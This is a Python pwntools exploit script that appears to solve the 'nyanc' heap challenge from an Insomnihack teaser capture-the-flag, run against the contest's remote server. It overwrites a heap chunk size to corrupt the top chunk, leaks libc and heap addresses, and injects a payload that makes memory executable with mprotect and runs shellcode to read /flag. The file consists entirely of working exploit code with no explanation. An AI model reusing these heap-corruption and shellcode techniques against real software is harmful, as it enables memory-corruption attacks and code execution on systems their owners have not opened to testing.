from pwn import *

#r = process("qemu-aarch64 -g 1234 -L  . nyanc".split())
r = remote("nyanc.teaser.insomnihack.ch",1337)
def add(size,content):
	r.sendlineafter(">","1")
	r.sendlineafter(":",str(size))
	if size > 0 :
		r.sendafter(":",content)

def edit(idx,content):
	r.sendlineafter(">","3")
	r.sendlineafter(":",str(idx))
	r.sendafter(":",content)

def show(idx):
	r.sendlineafter(">","2")
	r.sendlineafter(":",str(idx))

def remove(idx):
	r.sendlineafter(">","4")
	r.sendlineafter(":",str(idx))


offset = 0x21da0 #0x100da0
#offset = 0x100da0
add(0,"a")

edit(0,"a"*0x18+p16(0xd91))
add(0x1000,"a")
add(0x1000,p64(0)*2+p64(offset)+p64(0x20)+p64(0)*3+p64(0x21))

add(0,"a")
show(3)
r.recvuntil("data: ")
libc = u64(r.recvuntil("=")[:-1].ljust(8,'\x00'))-0x1540d0 #+ 0x4000000000
print hex(libc)

edit(3,"a"*0x18+p32(offset+1))
add(offset-0x1000-0x50,"a")
add(0x1100,"a")
show(1)
r.recvuntil("data: ")
heap = u64(r.recvuntil("=")[:-1].ljust(8,'\x00')) #+ 0x4000000000
print hex(heap)
#r.interactive()
add(0x1030,"a")
for i in range(7):
	remove(i)
add(0,"a")

target = libc+0x154200
top = heap + 0x3160
edit(0,"a"*0x18+"\xf1"+"\xff"*7)
print hex(top)
addr = heap+0x3170
context.arch = "aarch64"
payload = flat(addr&(~0xfff),0x3000,7).ljust(30*8,'\x00') + flat(addr+(33*8),heap,libc+0xccaf0)
payload += asm(shellcraft.cat('/flag'))+asm(shellcraft.echo("done")) + asm(shellcraft.exit(0))
r.sendlineafter(">","1")
r.sendlineafter(":",str(target-top))
r.sendafter(":",payload)
#edit(1,payload)
add(0x1ab0,"\x00"*0xf8+p64(libc+0x419e8))  #0x419e8)) 
r.sendlineafter(">","1")
r.sendlineafter(": ",str(addr-0xb8))
r.interactive()
